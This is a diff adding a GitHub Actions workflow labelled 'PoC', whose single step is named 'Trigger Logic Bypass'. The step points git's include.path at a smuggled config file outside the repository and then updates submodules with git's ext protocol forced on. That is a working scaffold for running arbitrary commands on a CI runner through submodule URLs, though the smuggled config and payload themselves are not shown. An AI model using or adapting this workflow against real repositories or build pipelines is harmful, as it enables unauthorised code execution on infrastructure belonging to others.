@@ -1,0 +1,14 @@
+name: PoC
+on: [push]
+jobs:
+  demonstration:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          submodules: false
+      - name: Trigger Logic Bypass
+        run: |
+          git config --local include.path ../.gitconfig_smuggled
+          git submodule init
+          git -c PROTOCOL.ext.ALLOW=always submodule update --no-fetch || true
